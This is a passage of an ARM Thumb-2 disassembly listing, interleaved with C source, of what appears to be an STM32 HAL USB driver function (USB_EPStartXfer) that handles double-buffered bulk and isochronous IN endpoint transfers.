 8006fbe:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fc2:	095b      	lsrs	r3, r3, #5
 8006fc4:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8006fc8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fcc:	f003 031f 	and.w	r3, r3, #31
 8006fd0:	2b00      	cmp	r3, #0
 8006fd2:	d104      	bne.n	8006fde <USB_EPStartXfer+0x5d4>
 8006fd4:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8006fd8:	3b01      	subs	r3, #1
 8006fda:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8006fde:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006fe0:	881b      	ldrh	r3, [r3, #0]
 8006fe2:	b29a      	uxth	r2, r3
 8006fe4:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8006fe8:	b29b      	uxth	r3, r3
 8006fea:	029b      	lsls	r3, r3, #10
 8006fec:	b29b      	uxth	r3, r3
 8006fee:	4313      	orrs	r3, r2
 8006ff0:	b29b      	uxth	r3, r3
 8006ff2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006ff6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006ffa:	b29a      	uxth	r2, r3
 8006ffc:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006ffe:	801a      	strh	r2, [r3, #0]
 8007000:	e056      	b.n	80070b0 <USB_EPStartXfer+0x6a6>
 8007002:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007006:	2b00      	cmp	r3, #0
 8007008:	d10a      	bne.n	8007020 <USB_EPStartXfer+0x616>
 800700a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800700c:	881b      	ldrh	r3, [r3, #0]
 800700e:	b29b      	uxth	r3, r3
 8007010:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007014:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007018:	b29a      	uxth	r2, r3
 800701a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800701c:	801a      	strh	r2, [r3, #0]
 800701e:	e047      	b.n	80070b0 <USB_EPStartXfer+0x6a6>
 8007020:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007024:	085b      	lsrs	r3, r3, #1
 8007026:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 800702a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800702e:	f003 0301 	and.w	r3, r3, #1
 8007032:	2b00      	cmp	r3, #0
 8007034:	d004      	beq.n	8007040 <USB_EPStartXfer+0x636>
 8007036:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 800703a:	3301      	adds	r3, #1
 800703c:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007040:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007042:	881b      	ldrh	r3, [r3, #0]
 8007044:	b29a      	uxth	r2, r3
 8007046:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 800704a:	b29b      	uxth	r3, r3
 800704c:	029b      	lsls	r3, r3, #10
 800704e:	b29b      	uxth	r3, r3
 8007050:	4313      	orrs	r3, r2
 8007052:	b29a      	uxth	r2, r3
 8007054:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007056:	801a      	strh	r2, [r3, #0]
 8007058:	e02a      	b.n	80070b0 <USB_EPStartXfer+0x6a6>
 800705a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800705e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007062:	681b      	ldr	r3, [r3, #0]
 8007064:	785b      	ldrb	r3, [r3, #1]
 8007066:	2b01      	cmp	r3, #1
 8007068:	d122      	bne.n	80070b0 <USB_EPStartXfer+0x6a6>
 800706a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800706e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007072:	681b      	ldr	r3, [r3, #0]
 8007074:	653b      	str	r3, [r7, #80]	; 0x50
 8007076:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800707a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800707e:	681b      	ldr	r3, [r3, #0]
 8007080:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007084:	b29b      	uxth	r3, r3
 8007086:	461a      	mov	r2, r3
 8007088:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800708a:	4413      	add	r3, r2
 800708c:	653b      	str	r3, [r7, #80]	; 0x50
 800708e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007092:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007096:	681b      	ldr	r3, [r3, #0]
 8007098:	781b      	ldrb	r3, [r3, #0]
 800709a:	00da      	lsls	r2, r3, #3
 800709c:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800709e:	4413      	add	r3, r2
 80070a0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80070a4:	64fb      	str	r3, [r7, #76]	; 0x4c
 80070a6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070aa:	b29a      	uxth	r2, r3
 80070ac:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 80070ae:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 80070b0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070b4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070b8:	681b      	ldr	r3, [r3, #0]
 80070ba:	891b      	ldrh	r3, [r3, #8]
 80070bc:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80070c0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070c4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070c8:	681b      	ldr	r3, [r3, #0]
 80070ca:	6959      	ldr	r1, [r3, #20]
 80070cc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070d0:	b29b      	uxth	r3, r3
 80070d2:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80070d6:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80070da:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80070de:	6800      	ldr	r0, [r0, #0]
 80070e0:	f001 f99f 	bl	8008422 <USB_WritePMA>
            ep->xfer_buff += len;
 80070e4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070e8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070ec:	681b      	ldr	r3, [r3, #0]
 80070ee:	695a      	ldr	r2, [r3, #20]
 80070f0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070f4:	441a      	add	r2, r3
 80070f6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070fa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070fe:	681b      	ldr	r3, [r3, #0]
 8007100:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8007102:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007106:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800710a:	681b      	ldr	r3, [r3, #0]
 800710c:	6a1a      	ldr	r2, [r3, #32]
 800710e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007112:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007116:	681b      	ldr	r3, [r3, #0]
 8007118:	691b      	ldr	r3, [r3, #16]
 800711a:	429a      	cmp	r2, r3
 800711c:	d90f      	bls.n	800713e <USB_EPStartXfer+0x734>
            {
              ep->xfer_len_db -= len;
 800711e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007122:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007126:	681b      	ldr	r3, [r3, #0]
 8007128:	6a1a      	ldr	r2, [r3, #32]
 800712a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800712e:	1ad2      	subs	r2, r2, r3
 8007130:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007134:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007138:	681b      	ldr	r3, [r3, #0]
 800713a:	621a      	str	r2, [r3, #32]
 800713c:	e00e      	b.n	800715c <USB_EPStartXfer+0x752>
            }
            else
            {
              len = ep->xfer_len_db;
 800713e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007142:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007146:	681b      	ldr	r3, [r3, #0]
 8007148:	6a1b      	ldr	r3, [r3, #32]
 800714a:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 800714e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007152:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007156:	681b      	ldr	r3, [r3, #0]
 8007158:	2200      	movs	r2, #0
 800715a:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 800715c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007160:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007164:	681b      	ldr	r3, [r3, #0]
 8007166:	643b      	str	r3, [r7, #64]	; 0x40
 8007168:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800716c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007170:	681b      	ldr	r3, [r3, #0]
 8007172:	785b      	ldrb	r3, [r3, #1]
 8007174:	2b00      	cmp	r3, #0
 8007176:	d177      	bne.n	8007268 <USB_EPStartXfer+0x85e>
 8007178:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800717c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007180:	681b      	ldr	r3, [r3, #0]
 8007182:	63bb      	str	r3, [r7, #56]	; 0x38
 8007184:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007188:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800718c:	681b      	ldr	r3, [r3, #0]
 800718e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007192:	b29b      	uxth	r3, r3
 8007194:	461a      	mov	r2, r3
 8007196:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8007198:	4413      	add	r3, r2
 800719a:	63bb      	str	r3, [r7, #56]	; 0x38
 800719c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071a0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071a4:	681b      	ldr	r3, [r3, #0]
 80071a6:	781b      	ldrb	r3, [r3, #0]
 80071a8:	00da      	lsls	r2, r3, #3
 80071aa:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80071ac:	4413      	add	r3, r2
 80071ae:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80071b2:	637b      	str	r3, [r7, #52]	; 0x34
 80071b4:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80071b6:	881b      	ldrh	r3, [r3, #0]
 80071b8:	b29b      	uxth	r3, r3
 80071ba:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80071be:	b29a      	uxth	r2, r3
 80071c0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80071c2:	801a      	strh	r2, [r3, #0]
 80071c4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071c8:	2b3e      	cmp	r3, #62	; 0x3e
 80071ca:	d921      	bls.n	8007210 <USB_EPStartXfer+0x806>
 80071cc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071d0:	095b      	lsrs	r3, r3, #5
 80071d2:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80071d6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071da:	f003 031f 	and.w	r3, r3, #31
 80071de:	2b00      	cmp	r3, #0
 80071e0:	d104      	bne.n	80071ec <USB_EPStartXfer+0x7e2>
 80071e2:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80071e6:	3b01      	subs	r3, #1
 80071e8:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80071ec:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80071ee:	881b      	ldrh	r3, [r3, #0]
 80071f0:	b29a      	uxth	r2, r3
 80071f2:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80071f6:	b29b      	uxth	r3, r3
 80071f8:	029b      	lsls	r3, r3, #10
 80071fa:	b29b      	uxth	r3, r3
 80071fc:	4313      	orrs	r3, r2
 80071fe:	b29b      	uxth	r3, r3
 8007200:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007204:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007208:	b29a      	uxth	r2, r3
 800720a:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800720c:	801a      	strh	r2, [r3, #0]
 800720e:	e050      	b.n	80072b2 <USB_EPStartXfer+0x8a8>
 8007210:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007214:	2b00      	cmp	r3, #0
 8007216:	d10a      	bne.n	800722e <USB_EPStartXfer+0x824>
 8007218:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800721a:	881b      	ldrh	r3, [r3, #0]
 800721c:	b29b      	uxth	r3, r3
 800721e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007222:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007226:	b29a      	uxth	r2, r3
 8007228:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800722a:	801a      	strh	r2, [r3, #0]
 800722c:	e041      	b.n	80072b2 <USB_EPStartXfer+0x8a8>
 800722e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007232:	085b      	lsrs	r3, r3, #1
 8007234:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007238:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800723c:	f003 0301 	and.w	r3, r3, #1
 8007240:	2b00      	cmp	r3, #0
 8007242:	d004      	beq.n	800724e <USB_EPStartXfer+0x844>
 8007244:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007248:	3301      	adds	r3, #1
 800724a:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 800724e:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007250:	881b      	ldrh	r3, [r3, #0]
 8007252:	b29a      	uxth	r2, r3
 8007254:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007258:	b29b      	uxth	r3, r3
 800725a:	029b      	lsls	r3, r3, #10
 800725c:	b29b      	uxth	r3, r3
 800725e:	4313      	orrs	r3, r2
 8007260:	b29a      	uxth	r2, r3
 8007262:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007264:	801a      	strh	r2, [r3, #0]
 8007266:	e024      	b.n	80072b2 <USB_EPStartXfer+0x8a8>
 8007268:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800726c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007270:	681b      	ldr	r3, [r3, #0]
 8007272:	785b      	ldrb	r3, [r3, #1]
 8007274:	2b01      	cmp	r3, #1
 8007276:	d11c      	bne.n	80072b2 <USB_EPStartXfer+0x8a8>
 8007278:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800727c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007280:	681b      	ldr	r3, [r3, #0]
 8007282:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007286:	b29b      	uxth	r3, r3
 8007288:	461a      	mov	r2, r3
 800728a:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 800728c:	4413      	add	r3, r2
 800728e:	643b      	str	r3, [r7, #64]	; 0x40
 8007290:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007294:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007298:	681b      	ldr	r3, [r3, #0]
 800729a:	781b      	ldrb	r3, [r3, #0]
 800729c:	00da      	lsls	r2, r3, #3
 800729e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80072a0:	4413      	add	r3, r2
 80072a2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80072a6:	63fb      	str	r3, [r7, #60]	; 0x3c
 80072a8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072ac:	b29a      	uxth	r2, r3
 80072ae:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80072b0:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 80072b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072b6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072ba:	681b      	ldr	r3, [r3, #0]
 80072bc:	895b      	ldrh	r3, [r3, #10]
 80072be:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80072c2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072c6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072ca:	681b      	ldr	r3, [r3, #0]
 80072cc:	6959      	ldr	r1, [r3, #20]
 80072ce:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072d2:	b29b      	uxth	r3, r3
 80072d4:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80072d8:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80072dc:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80072e0:	6800      	ldr	r0, [r0, #0]
 80072e2:	f001 f89e 	bl	8008422 <USB_WritePMA>
 80072e6:	e227      	b.n	8007738 <USB_EPStartXfer+0xd2e>
          }
        }
        /* auto Switch to single buffer mode when transfer <Mps no need to manage in double buffer */
        else
        {
          len = ep->xfer_len_db;
 80072e8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072ec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072f0:	681b      	ldr	r3, [r3, #0]
 80072f2:	6a1b      	ldr	r3, [r3, #32]
 80072f4:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104

          /* disable double buffer mode for Bulk endpoint */
          PCD_CLEAR_BULK_EP_DBUF(USBx, ep->num);
 80072f8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072fc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007300:	681a      	ldr	r2, [r3, #0]
 8007302:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007306:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800730a:	681b      	ldr	r3, [r3, #0]
 800730c:	781b      	ldrb	r3, [r3, #0]
 800730e:	009b      	lsls	r3, r3, #2
 8007310:	4413      	add	r3, r2
 8007312:	881b      	ldrh	r3, [r3, #0]
 8007314:	b29b      	uxth	r3, r3
 8007316:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 800731a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800731e:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 8007322:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007326:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800732a:	681a      	ldr	r2, [r3, #0]
 800732c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007330:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007334:	681b      	ldr	r3, [r3, #0]
 8007336:	781b      	ldrb	r3, [r3, #0]
 8007338:	009b      	lsls	r3, r3, #2
 800733a:	441a      	add	r2, r3
 800733c:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 8007340:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007344:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007348:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800734c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8007350:	b29b      	uxth	r3, r3
 8007352:	8013      	strh	r3, [r2, #0]

          /* Set Tx count with nbre of byte to be transmitted */
          PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8007354:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007358:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800735c:	681b      	ldr	r3, [r3, #0]
 800735e:	65fb      	str	r3, [r7, #92]	; 0x5c
 8007360:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007364:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007368:	681b      	ldr	r3, [r3, #0]
 800736a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800736e:	b29b      	uxth	r3, r3
 8007370:	461a      	mov	r2, r3
 8007372:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8007374:	4413      	add	r3, r2
 8007376:	65fb      	str	r3, [r7, #92]	; 0x5c
 8007378:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800737c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007380:	681b      	ldr	r3, [r3, #0]
 8007382:	781b      	ldrb	r3, [r3, #0]
 8007384:	00da      	lsls	r2, r3, #3
 8007386:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8007388:	4413      	add	r3, r2
 800738a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800738e:	65bb      	str	r3, [r7, #88]	; 0x58
 8007390:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007394:	b29a      	uxth	r2, r3
 8007396:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8007398:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 800739a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800739e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073a2:	681b      	ldr	r3, [r3, #0]
 80073a4:	891b      	ldrh	r3, [r3, #8]
 80073a6:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80073aa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073ae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073b2:	681b      	ldr	r3, [r3, #0]
 80073b4:	6959      	ldr	r1, [r3, #20]
 80073b6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073ba:	b29b      	uxth	r3, r3
 80073bc:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80073c0:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80073c4:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80073c8:	6800      	ldr	r0, [r0, #0]
 80073ca:	f001 f82a 	bl	8008422 <USB_WritePMA>
 80073ce:	e1b3      	b.n	8007738 <USB_EPStartXfer+0xd2e>
        }
      }
      else /* manage isochronous double buffer IN mode */
      {
        /* each Time to write in PMA xfer_len_db will */
        ep->xfer_len_db -= len;
 80073d0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073d4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073d8:	681b      	ldr	r3, [r3, #0]
 80073da:	6a1a      	ldr	r2, [r3, #32]
 80073dc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073e0:	1ad2      	subs	r2, r2, r3
 80073e2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073e6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073ea:	681b      	ldr	r3, [r3, #0]
 80073ec:	621a      	str	r2, [r3, #32]

        /* Fill the data buffer */
        if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 80073ee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073f2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073f6:	681a      	ldr	r2, [r3, #0]
 80073f8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073fc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007400:	681b      	ldr	r3, [r3, #0]
 8007402:	781b      	ldrb	r3, [r3, #0]
 8007404:	009b      	lsls	r3, r3, #2
 8007406:	4413      	add	r3, r2
 8007408:	881b      	ldrh	r3, [r3, #0]
 800740a:	b29b      	uxth	r3, r3
 800740c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007410:	2b00      	cmp	r3, #0
 8007412:	f000 80c6 	beq.w	80075a2 <USB_EPStartXfer+0xb98>
        {
          /* Set the Double buffer counter for pmabuffer1 */
          PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8007416:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800741a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800741e:	681b      	ldr	r3, [r3, #0]
 8007420:	673b      	str	r3, [r7, #112]	; 0x70
 8007422:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007426:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800742a:	681b      	ldr	r3, [r3, #0]
 800742c:	785b      	ldrb	r3, [r3, #1]
 800742e:	2b00      	cmp	r3, #0
 8007430:	d177      	bne.n	8007522 <USB_EPStartXfer+0xb18>
 8007432:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007436:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800743a:	681b      	ldr	r3, [r3, #0]
 800743c:	66bb      	str	r3, [r7, #104]	; 0x68
 800743e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007442:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007446:	681b      	ldr	r3, [r3, #0]
 8007448:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800744c:	b29b      	uxth	r3, r3
 800744e:	461a      	mov	r2, r3
 8007450:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8007452:	4413      	add	r3, r2
 8007454:	66bb      	str	r3, [r7, #104]	; 0x68
 8007456:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800745a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800745e:	681b      	ldr	r3, [r3, #0]
 8007460:	781b      	ldrb	r3, [r3, #0]
 8007462:	00da      	lsls	r2, r3, #3
 8007464:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8007466:	4413      	add	r3, r2
 8007468:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800746c:	667b      	str	r3, [r7, #100]	; 0x64
 800746e:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007470:	881b      	ldrh	r3, [r3, #0]
 8007472:	b29b      	uxth	r3, r3
 8007474:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007478:	b29a      	uxth	r2, r3
 800747a:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800747c:	801a      	strh	r2, [r3, #0]
 800747e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007482:	2b3e      	cmp	r3, #62	; 0x3e
 8007484:	d921      	bls.n	80074ca <USB_EPStartXfer+0xac0>
 8007486:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800748a:	095b      	lsrs	r3, r3, #5
 800748c:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007490:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007494:	f003 031f 	and.w	r3, r3, #31
 8007498:	2b00      	cmp	r3, #0
 800749a:	d104      	bne.n	80074a6 <USB_EPStartXfer+0xa9c>
 800749c:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80074a0:	3b01      	subs	r3, #1
 80074a2:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80074a6:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074a8:	881b      	ldrh	r3, [r3, #0]
 80074aa:	b29a      	uxth	r2, r3
 80074ac:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80074b0:	b29b      	uxth	r3, r3
 80074b2:	029b      	lsls	r3, r3, #10
 80074b4:	b29b      	uxth	r3, r3
 80074b6:	4313      	orrs	r3, r2
 80074b8:	b29b      	uxth	r3, r3
 80074ba:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80074be:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80074c2:	b29a      	uxth	r2, r3
 80074c4:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074c6:	801a      	strh	r2, [r3, #0]
 80074c8:	e050      	b.n	800756c <USB_EPStartXfer+0xb62>
 80074ca:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074ce:	2b00      	cmp	r3, #0
 80074d0:	d10a      	bne.n	80074e8 <USB_EPStartXfer+0xade>
 80074d2:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074d4:	881b      	ldrh	r3, [r3, #0]
 80074d6:	b29b      	uxth	r3, r3
 80074d8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80074dc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80074e0:	b29a      	uxth	r2, r3
 80074e2:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074e4:	801a      	strh	r2, [r3, #0]
 80074e6:	e041      	b.n	800756c <USB_EPStartXfer+0xb62>
 80074e8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074ec:	085b      	lsrs	r3, r3, #1
 80074ee:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
